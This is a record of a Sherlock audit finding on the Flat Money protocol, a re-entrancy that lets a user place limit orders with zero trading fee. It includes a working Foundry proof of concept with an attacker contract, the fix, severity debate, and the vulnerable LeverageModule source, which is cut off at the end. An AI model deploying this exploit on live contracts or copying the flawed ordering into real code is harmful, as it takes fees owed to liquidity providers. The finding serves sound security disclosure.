{
  "Title": "H-2: A malicious user can bypass limit order trading fees via cross-function re-entrancy",
  "Content": "# Issue H-2: A malicious user can bypass limit order trading fees via cross-function re-entrancy \n\nSource: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/75 \n\n## Found by \nLTDingZhen, juan, nobody2018, r0ck3tz\n## Summary\nA malicious user can bypass limit order trading fees via cross-function re-entrancy, since `_safeMint` makes an external call to the user before updating state.\n\n## Vulnerability Detail\nIn the `LeverageModule` contract, the `_mint` function calls `_safeMint`, which makes an external call to the receiver of the NFT (the `to` address).\n\n<details>\n<summary>LeverageModule::_mint()</summary>\n\n```javascript\nfunction _mint(address _to) internal returns (uint256 _tokenId) {\n        _tokenId = tokenIdNext;\n\n        _safeMint(_to, tokenIdNext);\n\n        tokenIdNext += 1;\n}\n```\n</details>\n\nOnly after this external call, `vault.setPosition()` is called to create the new position in the vault's storage mapping. This means that an attacker can gain control of the execution while the state of  `_positions[_tokenId]` in FlatcoinVault is not up-to-date.\n\n<details>\n\n<summary>LeverageModule::executeOpen()</summary>\n\n```javascript\n_newTokenId = _mint(_account); // Here, an attack gains control of execution\n\nvault.setPosition( // This updates _positions[_tokenId] in the FlatcoinVault, but after the external call\n    FlatcoinStructs.Position({\n        lastPrice: entryPrice,\n        marginDeposited: announcedOpen.margin,\n        additionalSize: announcedOpen.additionalSize,\n        entryCumulativeFunding: vault.cumulativeFundingRate()\n    }),\n    _newTokenId\n);\n```\n\n> Permalink: https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LeverageModule.sol#L111-L121\n\n</details>\n\nThis outdated state of `_positions[_tokenId]` can be exploited by an attacker once the external call has been made. They can re-enter `LimitOrder::announceLimitOrder()` and provide the tokenId that has just been minted.\nIn that function, the trading fee is calculated as follows:\n\n```javascript\nuint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(\n    vault.getPosition(tokenId).additionalSize\n);\n```\nHowever since the position has not been created yet (due to state being updated after an external call), this results in the `tradeFee` being 0 since `vault.getPosition(tokenId).additionalSize` returns the default value of a uint256 (0), and `tradeFee` = fee * size.\n\nHence, when the limit order is executed, the trading fee (`tradeFee`) charged to the user will be `0`.\n\n## Impact\nA malicious user can bypass the trading fees for a limit order, via cross-function re-entrancy. These trading fees were supposed to be paid to the LPs by increasing `stableCollateralTotal`, but due to limit orders being able to bypass trading fees (albeit during the same transaction as opening the position), LPs are now less incentivised to provide their liquidity to the protocol.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LeverageModule.sol#L111-L121\n\n## Proof of Concept\nSummary:\n1. A user announces opening a leverage position, calling announceLeverageOpen() via a smart contract which implements `IERC721Receiver`.\n2. Once the keeper executes the order, the contract is called, with the function `onERC721Received(address,address,uint256,bytes)`\n3. The function calls `LimitOrder::announceLimitOrder()` to create the desired limit order to close the position. (stop loss, take profit levels)\n4. The contract then returns `msg.sig` (the function signature of the executing function) to satify the `IERC721Receiver`'s requirement.\n\nTo run this proof of concept:\n1. Add 2 files `AttackerContract.sol` and `ReentrancyPoC.t.sol` to `flatcoin-v1/test/unit` in the project's repo.\n2. run `forge test --mt test_tradingFeeBypass -vv` in the terminal\n\n<details><summary>Attacker Contract</summary>\n\n```javascript\n// SPDX-License-Identifier: SEE LICENSE IN LICENSE\npragma solidity 0.8.18;\n\nimport {OrderHelpers} from \"../helpers/OrderHelpers.sol\";\nimport {FlatcoinStructs} from \"../../src/libraries/FlatcoinStructs.sol\";\nimport \"forge-std/console2.sol\";\nimport {Setup} from \"../helpers/Setup.sol\";\nimport {LimitOrder} from \"src/LimitOrder.sol\";\n\ncontract AttackerContract {\n\n    LimitOrder limitOrderProxy;\n\n    function setLimitOrderProxy(address limitOrderAddress) external {\n        limitOrderProxy = LimitOrder(limitOrderAddress);\n    }\n    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns(bytes4) {\n        // Do the cross-function re-entrancy\n        limitOrderProxy.announceLimitOrder(tokenId, 750e18, 1250e18);\n\n        // Return the function signature (required by the standard)\n        return msg.sig;\n        // Note: Also could return `this.onERC721Received.selector` or `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\n    }\n}\n```\n</details>\n\n<details>\n<summary>Proof of Concept (Foundry Test)</summary>\n\n```javascript\n// SPDX-License-Identifier: SEE LICENSE IN LICENSE\npragma solidity 0.8.18;\n\nimport {OrderHelpers} from \"../helpers/OrderHelpers.sol\";\nimport {FlatcoinStructs} from \"../../src/libraries/FlatcoinStructs.sol\";\nimport \"forge-std/console2.sol\";\nimport {AttackerContract} from \"./AttackerContract.sol\";\nimport {Setup} from \"../helpers/Setup.sol\";\n\ncontract ReentrancyPoC is Setup, OrderHelpers {\n    function test_tradingFeeBypass() public {\n        \n        // Set up and initialize the attacker's contract\n        AttackerContract attackerContract = new AttackerContract();\n        attackerContract.setLimitOrderProxy(address(limitOrderProxy));\n\n        // Deal the exploiter contract with WETH + ETH\n        deal(address(WETH), address(attackerContract), 100_000e18); // Loading account with `token`.\n        deal(address(attackerContract), 100_000e18); // Loading account with native token.\n\n        uint256 aliceBalanceBefore = WETH.balanceOf(alice);\n        uint256 stableDeposit = 100e18;\n        uint256 collateralPrice = 1000e8;\n\n        // Alice provides liquidity\n        vm.startPrank(alice);\n        announceAndExecuteDeposit({\n            traderAccount: alice,\n            keeperAccount: keeper,\n            depositAmount: stableDeposit,\n            oraclePrice: collateralPrice,\n            keeperFeeAmount: 0\n        });\n        vm.stopPrank();\n\n        // Contract opens position: 10 ETH collateral, 30 ETH additional size (4x leverage)\n        uint256 tokenId = announceAndExecuteLeverageOpen({\n            traderAccount: address(attackerContract),\n            keeperAccount: keeper,\n            margin: 10e18,\n            additionalSize: 30e18,\n            oraclePrice: collateralPrice,\n            keeperFeeAmount: 0\n        });\n\n        // Get the limit order that has been created by the attacker's contract\n        FlatcoinStructs.Order memory limitOrderCreated = limitOrderProxy.getLimitOrder(tokenId);\n\n        // Get the order's data\n        FlatcoinStructs.LimitClose memory orderData = abi.decode(limitOrderCreated.orderData, (FlatcoinStructs.LimitClose));\n        \n        ///////////////////////\n        // POC Assertions    //\n        ///////////////////////\n        // Assert that the tradeFee for the limit order is 0\n        assertEq(orderData.tradeFee, 0);\n\n        // Assert that the price threshold is 750e18, showing that it is not zero, showing that the orderData is not just returning the default values.\n        assertEq(orderData.priceLowerThreshold, 750e18);\n\n\n        ///////////////////////\n        // Other Assertions  //\n        ///////////////////////\n        // The following assertions are copied from another test in the test suite-\n\n        // ERC721 token assertions:\n        {\n            (uint256 buyPrice, ) = oracleModProxy.getPrice();\n            // Position 0:\n            FlatcoinStructs.Position memory position0 = vaultProxy.getPosition(tokenId);\n            assertEq(position0.lastPrice, buyPrice, \"Entry price is not correct\");\n            assertEq(position0.marginDeposited, 10e18, \"Margin deposited is not correct\");\n            assertEq(position0.additionalSize, 30e18, \"Size is not correct\");\n            assertEq(tokenId, 0, \"Token ID is not correct\");\n        }\n        // PnL assertions:\n        {\n            FlatcoinStructs.PositionSummary memory positionSummary0 = leverageModProxy.getPositionSummary(tokenId);\n            uint256 collateralPerShareBefore = stableModProxy.stableCollateralPerShare();\n\n            // Check that before the WETH price change, there is no profit or loss change\n            assertEq(positionSummary0.profitLoss, 0, \"Pnl for user 0 is not correct\");\n            assertEq(\n                positionSummary0.marginAfterSettlement,\n                10e18,\n                \"Margin after settlement for user 0 is not correct\"\n            ); // full margin available\n        }\n    }  \n}\n```\n\n</details>\n\n<details>\n<summary> Console Output </summary>\n\n```powershell\nRunning 1 test for test/unit/ReentrancyPoC.t.sol:ReentrancyPoC\n[PASS] test_tradingFeeBypass() (gas: 2006498)\nLogs:\n  tradeFee: 0\n\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.81ms\n \nRan 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\n</details>\n\n## Tool used\nManual Review\n\n## Recommendation\nTo fix this specific issue, the following change is sufficient:\n```diff\n-_newTokenId = _mint(_account); \n\nvault.setPosition( \n    FlatcoinStructs.Position({\n        lastPrice: entryPrice,\n        marginDeposited: announcedOpen.margin,\n        additionalSize: announcedOpen.additionalSize,\n        entryCumulativeFunding: vault.cumulativeFundingRate()\n    }),\n-   _newTokenId\n+   tokenIdNext\n);\n+_newTokenId = _mint(_account); \n``` \nHowever there are still more state changes that would occur after the `_mint` function (potentially yielding other cross-function re-entrancy if the other contracts were changed) so the optimum solution would be to mint the NFT after all state changes have been executed, so the safest solution would be to move `_mint` all the way to the end of `LeverageModule::executeOpen()`.\n\nOtherwise, if changing this order of operations is undesirable for whatever reason, one can implement the following check within `LimitOrder::announceLimitOrder()` to ensure that the `positions[_tokenId]` is not uninitialized:\n\n```diff\nuint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(\n    vault.getPosition(tokenId).additionalSize\n);\n\n+require(additionalSize > 0, \"Additional Size of a position cannot be zero\");\n\n```\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  valid: medium finding as there is no profit in doing so; user closed position immediately after opening it; medium(5)\n\n\n\n**ydspa**\n\nEscalate\n\nFee loss in certain circumstance is a Medium issue\n\n**sherlock-admin2**\n\n> Escalate\n> \n> Fee loss in certain circumstance is a Medium issue\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**securitygrid**\n\nThe tradeFee of an order may be relatively small, but imagine that the accumulated tradeFee of high-frequency trading or a large number of orders will be small?\n\n**r0ck3tzx**\n\nThe severity should be high, as it is easy to create a separate service that could enable the opening of leverage positions with limit orders (stop loss and take profit) at a 0 trade fee, allowing the siphoning of value from the Flat Money protocol at scale.\n\n\n\n**0xLogos**\n\nEscalate\n\nDup of #212 bcz same root cause: fee must be calculated at execution time of the limit order\n\n**sherlock-admin2**\n\n> Escalate\n> \n> Dup of #212 bcz same root cause: fee must be calculated at execution time of the limit order\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**r0ck3tzx**\n\n> Escalate\n> \n> Dup of #212 bcz same root cause: fee must be calculated at execution time of the limit order\n\nIts not the same root cause, the root cause of this is the update of state `setPosition` that happens after the minting process that allows hijacking the execution.\n\n**xiaoming9090**\n\nEscalate.\n\nThe impact of this issue is that the LPs will not receive the trade fee. This is similar to other issues where the protocol did not receive their entitled trade fee due to some error and should be categorized as loss of fee OR loss of earning, and thus should be a Medium. \n\nAlso, note that the LPs gain/earn when the following event happens:\n\n- Loss of the long trader. This is because LP is the short side. The loss of a long trader is the gain of a short trader.\n- Open, adjust, close long position - (0.1% fee)\n- Open limit order - (0.1% fee)\n- Borrow Rate Fees (aka Funding Rate)\n- Liquidation Fees\n- ETH Staking Yield\n\nStatically, the bulk of the LP gain comes from the loss of the long trader in such a long-short prep protocol in the real world. The uncollected trading fee due to certain malicious users opening limit orders only makes up a very small portion of the earnings and does not materially impact the LPs or protocols. Also, this is not a bug that would drain the protocol, directly steal the assets of LPs, or lead to the protocol being insolvent. Thus, this issue should not be High. A risk rating of Medium would be more appropriate in this case.\n\n**sherlock-admin2**\n\n> Escalate.\n> \n> The impact of this issue is that the LPs will not receive the trade fee. This is similar to other issues where the protocol did not receive their entitled trade fee due to some error and should be categorized as loss of fee OR loss of earning, and thus should be a Medium. \n> \n> Also, note that the LPs gain/earn when the following event happens:\n> \n> - Loss of the long trader. This is because LP is the short side. The loss of a long trader is the gain of a short trader.\n> - Open, adjust, close long position - (0.1% fee)\n> - Open limit order - (0.1% fee)\n> \n> Statically, the bulk of the LP gain comes from the loss of the long trader in such a long-short prep protocol in the real world. The uncollected trading fee due to certain malicious users opening limit orders only makes up a very small portion of the earnings and does not materially impact the LPs or protocols. Also, this is not a bug that would drain the protocol, directly steal the assets of LPs, or lead to the protocol being insolvent. Thus, this issue should not be High. A risk rating of Medium would be more appropriate in this case.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**sherlock-admin**\n\nThe protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/279.\n\n**securitygrid**\n\nThe root cause of reentrancy is that the CEI pattern is not applied, and bypassing tradeFee is just an attack method. This issue is not a Dup of #212. Different roots, different fixes.\nThe tradeFee is given to the short side, which means a loss of funds for them.\n\n\n\n**nevillehuang**\n\nAgree, this has separate root causes as #212. I have a similar stance for this issue based on my comment [here](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/212#issuecomment-1960994558).\n\n**Czar102**\n\nI think High severity is appropriate, see https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/212#issuecomment-1967232859.\n\nI believe the root causes and fixes are different, so supported by @nevillehuang's expertise, planning not to duplicate these issues.\n\nPlanning to reject the escalations and leave the issue as is.\n\n**Czar102**\n\nResult:\nHigh\nHas duplicates\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [ydspa](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/75/#issuecomment-1955908637): rejected\n- [0xLogos](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/75/#issuecomment-1957729031): rejected\n- [xiaoming9090](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/75/#issuecomment-1959560417): rejected\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/132",
  "Code": [
    {
      "filename": "flatcoin-v1/src/LeverageModule.sol",
      "content": "// SPDX-License-Identifier: SEE LICENSE IN LICENSE\npragma solidity 0.8.18;\n\nimport {SafeCastUpgradeable} from \"openzeppelin-contracts-upgradeable/contracts/utils/math/SafeCastUpgradeable.sol\";\nimport {ERC721LockableEnumerableUpgradeable} from \"./misc/ERC721LockableEnumerableUpgradeable.sol\";\n\nimport {DecimalMath} from \"./libraries/DecimalMath.sol\";\nimport {PerpMath} from \"./libraries/PerpMath.sol\";\nimport {FlatcoinErrors} from \"./libraries/FlatcoinErrors.sol\";\nimport {FlatcoinStructs} from \"./libraries/FlatcoinStructs.sol\";\nimport {FlatcoinModuleKeys} from \"./libraries/FlatcoinModuleKeys.sol\";\nimport {FlatcoinEvents} from \"./libraries/FlatcoinEvents.sol\";\nimport {ModuleUpgradeable} from \"./abstracts/ModuleUpgradeable.sol\";\n\nimport {IFlatcoinVault} from \"./interfaces/IFlatcoinVault.sol\";\nimport {ILeverageModule} from \"./interfaces/ILeverageModule.sol\";\nimport {ILiquidationModule} from \"./interfaces/ILiquidationModule.sol\";\nimport {IOracleModule} from \"./interfaces/IOracleModule.sol\";\nimport {IPointsModule} from \"./interfaces/IPointsModule.sol\";\nimport {ILimitOrder} from \"./interfaces/ILimitOrder.sol\";\n\n/// @title LeverageModule\n/// @author dHEDGE\n/// @notice Contains functions to create/manage leverage positions.\n/// @dev This module shouldn't hold any funds but can direct the vault to transfer funds.\ncontract LeverageModule is ILeverageModule, ModuleUpgradeable, ERC721LockableEnumerableUpgradeable {\n    using SafeCastUpgradeable for *;\n    using DecimalMath for uint256;\n\n    /// @notice ERC721 token ID increment on mint.\n    uint256 public tokenIdNext;\n\n    /// @notice Leverage trading fee. Charged for opening, adjusting or closing a position.\n    /// @dev 1e18 = 100%\n    uint256 public levTradingFee; // Fee for leverage position open/close. 1e18 = 100%\n\n    /// @notice Leverage position criteria limits\n    /// @notice A minimum margin limit adds a cost to create a position and ensures it can be liquidated at high leverage\n    uint256 public marginMin;\n\n    /// @notice Minimum leverage limit ensures that the position is valuable and adds long open interest\n    uint256 public leverageMin;\n\n    /// @notice Maximum leverage limit ensures that the position is safely liquidatable by keepers\n    uint256 public leverageMax;\n\n    /// @dev To prevent the implementation contract from being used, we invoke the _disableInitializers\n    /// function in the constructor to automatically lock it when it is deployed.\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    /// @notice Function to initialize this contract.\n    function initialize(\n        IFlatcoinVault _vault,\n        uint256 _levTradingFee,\n        uint256 _marginMin,\n        uint256 _leverageMin,\n        uint256 _leverageMax\n    ) external initializer {\n        __Module_init(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY, _vault);\n        __ERC721_init(\"Flatmoney Leveraged Positions\", \"LEV\");\n\n        setLevTradingFee(_levTradingFee);\n        setLeverageCriteria(_marginMin, _leverageMin, _leverageMax);\n    }\n\n    /////////////////////////////////////////////\n    //         External Write Functions         //\n    /////////////////////////////////////////////\n\n    /// @notice Leverage open function. Mints ERC721 token receipt.\n    /// @dev Has to be used in conjunction with the DelayedOrder module.\n    /// @dev Uses the Pyth network price to execute.\n    /// @param _account The user account which has a pending open leverage order.\n    /// @param _keeper The address of the keeper executing the order.\n    /// @param _order The order to be executed.\n    /// @return _newTokenId The ERC721 token ID of the new leverage position.\n    function executeOpen(\n        address _account,\n        address _keeper,\n        FlatcoinStructs.Order calldata _order\n    ) external whenNotPaused onlyAuthorizedModule returns (uint256 _newTokenId) {\n        // Make sure the oracle price is after the order executability time\n        uint32 maxAge = _getMaxAge(_order.executableAtTime);\n\n        FlatcoinStructs.AnnouncedLeverageOpen memory announcedOpen = abi.decode(\n            _order.orderData,\n            (FlatcoinStructs.AnnouncedLeverageOpen)\n        );\n\n        // Check that buy price doesn't exceed requested price.\n        (uint256 entryPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice({\n            maxAge: maxAge\n        });\n\n        if (entryPrice > announcedOpen.maxFillPrice)\n            revert FlatcoinErrors.HighSlippage(entryPrice, announcedOpen.maxFillPrice);\n\n        vault.checkSkewMax({additionalSkew: announcedOpen.additionalSize});\n\n        {\n            // The margin change is equal to funding fees accrued to longs and the margin deposited by the trader.\n            vault.updateGlobalPositionData({\n                price: entryPrice,\n                marginDelta: int256(announcedOpen.margin),\n                additionalSizeDelta: int256(announcedOpen.additionalSize)\n            });\n\n            _newTokenId = _mint(_account);\n\n            vault.setPosition(\n                FlatcoinStructs.Position({\n                    lastPrice: entryPrice,\n                    marginDeposited: announcedOpen.margin,\n                    additionalSize: announcedOpen.additionalSize,\n                    entryCumulativeFunding: vault.cumulativeFundingRate()\n                }),\n                _newTokenId\n            );\n        }\n\n        // Check that the new position isn't immediately liquidatable.\n        if (\n            ILiquidationModule(vault.moduleAddress(FlatcoinModuleKeys._LIQUIDATION_MODULE_KEY)).canLiquidate(\n                _newTokenId\n            )\n        ) revert FlatcoinErrors.PositionCreatesBadDebt();\n\n        // Mint points\n        IPointsModule pointsModule = IPointsModule(vault.moduleAddress(FlatcoinModuleKeys._POINTS_MODULE_KEY));\n        pointsModule.mintLeverageOpen(_account, announcedOpen.additionalSize);\n\n        // Settle the collateral\n        vault.updateStableCollateralTotal(int256(announcedOpen.tradeFee)); // pay the trade fee to stable LPs\n        vault.sendCollateral({to: _keeper, amount: _order.keeperFee}); // pay the keeper their fee\n\n        emit FlatcoinEvents.LeverageOpen(_account, _newTokenId);\n    }\n\n    /// @notice Leverage adjust function.\n    /// @dev Needs to be used in conjunction with the DelayedOrder module.\n    /// @param _account The user account which has a pending adjust leverage order.\n    /// @param _keeper The address of the keeper executing the order.\n    /// @param _order The order to be executed.\n    function executeAdjust(\n        address _account,\n        address _keeper,\n        FlatcoinStructs.Order calldata _order\n    ) external whenNotPaused onlyAuthorizedModule {\n        uint32 maxAge = _getMaxAge(_order.executableAtTime);\n\n        FlatcoinStructs.AnnouncedLeverageAdjust memory announcedAdjust = abi.decode(\n            _order.orderData,\n            (FlatcoinStructs.AnnouncedLeverageAdjust)\n        );\n\n        (uint256 adjustPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice({\n            maxAge: maxAge\n        });\n\n        if (announcedAdjust.additionalSizeAdjustment >= 0) {\n            // Given that the size of a position is being increased, it's necessary to check that\n            // it doesn't exceed the max skew limit.\n            vault.checkSkewMax(uint256(announcedAdjust.additionalSizeAdjustment));\n\n            if (adjustPrice > announcedAdjust.fillPrice)\n                revert FlatcoinErrors.HighSlippage(adjustPrice, announcedAdjust.fillPrice);\n        } else {\n            if (adjustPrice < announcedAdjust.fillPrice)\n                revert FlatcoinErrors.HighSlippage(adjustPrice, announcedAdjust.fillPrice);\n        }\n\n        FlatcoinStructs.Position memory position = vault.getPosition(announcedAdjust.tokenId);\n\n        // Fees come out from the margin if the margin is being reduced or remains unchanged (meaning the size is being modified).\n        int256 marginAdjustment = (announcedAdjust.marginAdjustment > 0)\n            ? announcedAdjust.marginAdjustment\n            : announcedAdjust.marginAdjustment - int256(announcedAdjust.totalFee);\n\n        vault.updateGlobalPositionData({\n            price: adjustPrice,\n            marginDelta: marginAdjustment,\n            additionalSizeDelta: announcedAdjust.additionalSizeAdjustment\n        });\n\n        int256 cumulativeFunding = vault.cumulativeFundingRate();\n\n        // This accounts for the profit loss and funding fees accrued till now.\n        uint256 newMargin = (marginAdjustment +\n            PerpMath\n                ._getPositionSummary({position: position, nextFundingEntry: cumulativeFunding, price: adjustPrice})\n                .marginAfterSettlement).toUint256();\n\n        uint256 newAdditionalSize = (int256(position.additionalSize) + announcedAdjust.additionalSizeAdjustment)\n            .toUint256();\n\n        // Check that the new position isn't immediately liquidatable.\n        if (\n            newMargin <=\n            ILiquidationModule(vault.moduleAddress(FlatcoinModuleKeys._LIQUIDATION_MODULE_KEY)).getLiquidationMargin(\n                newAdditionalSize,\n                adjustPrice\n            )\n        ) revert FlatcoinErrors.PositionCreatesBadDebt();\n\n        // Check that the leverage isn't too high.\n        checkLeverageCriteria(newMargin, newAdditionalSize);\n\n        vault.setPosition(\n            FlatcoinStructs.Position({\n                lastPrice: adjustPrice,\n                marginDeposited: newMargin,\n                additionalSize: newAdditionalSize,\n                entryCumulativeFunding: cumulativeFunding\n            }),\n            announcedAdjust.tokenId\n        );\n\n        // Unlock the position token to allow for transfers.\n        _unlock(announcedAdjust.tokenId);\n\n        // Mint points.\n        if (announcedAdjust.additionalSizeAdjustment > 0) {\n            address positionOwner = ownerOf(announcedAdjust.tokenId);\n            IPointsModule pointsModule = IPointsModule(vault.moduleAddress(FlatcoinModuleKeys._POINTS_MODULE_KEY));\n\n            pointsModule.mintLeverageOpen(positionOwner, uint256(announcedAdjust.additionalSizeAdjustment));\n        }\n\n        if (announcedAdjust.tradeFee > 0) vault.updateStableCollateralTotal(int256(announcedAdjust.tradeFee));\n\n        // Sending keeper fee from order contract to the executor.\n        vault.sendCollateral({to: _keeper, amount: _order.keeperFee});\n\n        if (announcedAdjust.marginAdjustment < 0) {\n            // We send the user that much margin they requested during announceLeverageAdjust().\n            // However their remaining margin is reduced by the fees.\n            // It is accounted in announceLeverageAdjust().\n            uint256 marginToWithdraw = uint256(announcedAdjust.marginAdjustment * -1);\n\n            // Withdrawing margin from the vault and sending it to the user.\n            vault.sendCollateral({to: _account, amount: marginToWithdraw});\n        }\n\n        emit FlatcoinEvents.LeverageAdjust(announcedAdjust.tokenId);\n    }\n\n    /// @notice Leverage close function.\n    /// @dev Needs to be used in conjunction with the DelayedOrder module.\n    /// @param _account The user account which has a pending close leverage order.\n    /// @param _keeper The address of the keeper executing the order.\n    /// @param _order The order to be executed.\n    function executeClose(\n        address _account,\n        address _keeper,\n        FlatcoinStructs.Order calldata _order\n    ) external whenNotPaused onlyAuthorizedModule returns (int256 settledMargin) {\n        FlatcoinStructs.AnnouncedLeverageClose memory announcedClose = abi.decode(\n            _order.orderData,\n            (FlatcoinStructs.AnnouncedLeverageClose)\n        );\n        FlatcoinStructs.Position memory position = vault.getPosition(announcedClose.tokenId);\n\n        // Make sure the oracle price is after the order executability time\n        uint32 maxAge = _getMaxAge(_order.executableAtTime);\n\n        // check that sell price doesn't exceed requested price\n        (uint256 exitPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice({\n            maxAge: maxAge\n        });\n        if (exitPrice < announcedClose.minFillPrice)\n            revert FlatcoinErrors.HighSlippage(exitPrice, announcedClose.minFillPrice);\n\n        uint256 totalFee;\n        {\n            FlatcoinStructs.PositionSummary memory positionSummary = PerpMath._getPositionSummary(\n                position,\n                vault.cumulativeFundingRate(),\n                exitPrice\n            );\n\n            settledMargin = positionSummary.marginAfterSettlement;\n            totalFee = announcedClose.tradeFee + _order.keeperFee;\n\n            if (settledMargin <= 0) revert FlatcoinErrors.ValueNotPositive(\"settledMargin\");\n            // Make sure there is enough margin in the position to pay the keeper fee\n            if (settledMargin < int256(totalFee)) revert FlatcoinErrors.NotEnoughMarginForFees(settledMargin, totalFee);\n\n            vault.updateGlobalPositionData({\n                price: exitPrice,\n                marginDelta: -settledMargin,\n                additionalSizeDelta: -int256(position.additionalSize)\n            });\n\n            // Delete position storage\n            vault.deletePosition(announcedClose.tokenId);\n        }\n\n        // Cancel any existing limit order on the position\n        ILimitOrder(vault.moduleAddress(FlatcoinModuleKeys._LIMIT_ORDER_KEY)).cancelExistingLimitOrder(\n            announcedClose.tokenId\n        );\n\n        // A position NFT has to be unlocked before burning otherwise, the transfer to address(0) will fail.\n        _unlock(announcedClose.tokenId);\n        _burn(announcedClose.tokenId);\n\n        vault.updateStableCollateralTotal(int256(announcedClose.tradeFee)); // pay the trade fee to stable LPs\n\n        // Settle the collateral.\n        vault.sendCollateral({to: _keeper, amount: _order.keeperFee}); // pay the keeper their fee\n        vault.sendCollateral({to: _account, amount: uint256(settledMargin) - totalFee}); // transfer remaining amount to the trader\n\n        emit FlatcoinEvents.LeverageClose(announcedClose.tokenId);\n    }\n\n    /// @notice Burns the ERC721 token representing the leverage position.\n    /// @param _tokenId The ERC721 token ID of the leverage position.\n    function burn(uint256 _tokenId) external onlyAuthorizedModule {\n        _burn(_tokenId);\n    }\n\n    /// @notice Locks the ERC721 token representing the leverage position.\n    /// @param _tokenId The ERC721 token ID of the leverage position.\n    function lock(uint256 _tokenId) public onlyAuthorizedModule {\n        _lock(_tokenId);\n    }\n\n    /// @notice Unlocks the ERC721 token representing the leverage position.\n    /// @param tokenId The ERC721 token ID of the leverage position.\n    function unlock(uint256 tokenId) public onlyAuthorizedModule {\n        _unlock(tokenId);\n    }\n\n    /////////////////////////////////////////////\n    //             View Functions              //\n    /////////////////////////////////////////////\n\n    /// @notice Returns the lock status of a leverage NFT position.\n    /// @param _tokenId The ERC721 token ID of the leverage position.\n    /// @return _lockStatus The lock status of the leverage position.\n    function isLocked(uint256 _tokenId) public view override returns (bool _lockStatus) {\n        return _isLocked[_tokenId];\n    }\n\n    /// @notice Returns a summary of a leverage position.\n    /// @param _tokenId The ERC721 token ID of the leverage position.\n    /// @return _positionSummary The summary of the leverage position.\n    function getPositionSummary(\n        uint256 _tokenId\n    ) public view returns (FlatcoinStructs.PositionSummary memory _positionSummary) {\n        FlatcoinStructs.Position memory position = vault.getPosition(_tokenId);\n        FlatcoinStructs.VaultSummary memory vaultSummary = vault.getVaultSummary();\n\n        (uint256 currentPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice();\n\n        // Get the nextFundingEntry for the market.\n        int256 nextFundingEntry = PerpMath._nextFundingEntry(\n            vaultSummary,\n            vault.maxFundingVelocity(),\n            vault.maxVelocitySkew()\n        );\n\n        return PerpMath._getPositionSummary(position, nextFundingEntry, currentPrice);\n    }\n\n    /// @notice Returns a summary of the market.\n    /// @dev This includes all the parameters which are related mostly with the leverage traders.\n    /// @return _marketSummary The summary of the market.\n    function getMarketSummary() public view returns (FlatcoinStructs.MarketSummary memory _marketSummary) {\n        FlatcoinStructs.VaultSummary memory vaultSummary = vault.getVaultSummary();\n\n        (uint256 currentPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice();\n\n        return\n            PerpMath._getMarketSummaryLongs(\n                vaultSummary,\n                vault.maxFundingVelocity(),\n                vault.maxVelocitySkew(),\n                currentPrice\n            );\n    }\n\n    /// @notice Returns the total profit and loss of all the leverage positions.\n    /// @dev Adjusts for the funding fees accrued.\n    /// @return _fundingAdjustedPnL The total profit and loss of all the leverage positions.\n    function fundingAdjustedLongPnLTotal() public view returns (int256 _fundingAdjustedPnL) {\n        return fundingAdjustedLongPnLTotal({_maxAge: type(uint32).max});\n    }\n\n    /// @notice Returns the total profit and loss of all the leverage positions.\n    /// @dev Adjusts for the funding fees accrued.\n    /// @param _maxAge The maximum age of the oracle price to be used.\n    /// @return _fundingAdjustedPnL The total profit and loss of all the leverage positions.\n    function fundingAdjustedLongPnLTotal(uint32 _maxAge) public view returns (int256 _fundingAdjustedPnL) {\n        (uint256 currentPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice({\n            maxAge: _maxAge\n        });\n\n        FlatcoinStructs.VaultSummary memory vaultSummary = vault.getVaultSummary();\n        FlatcoinStructs.MarketSummary memory marketSummary = PerpMath._getMarketSummaryLongs(\n            vaultSummary,\n            vault.maxFundingVelocity(),\n            vault.maxVelocitySkew(),\n            currentPrice\n        );\n\n        return marketSummary.profitLossTotalByLongs + marketSummary.accruedFundingTotalByLongs;\n    }\n\n    /// @notice Asserts that the position to be opened meets 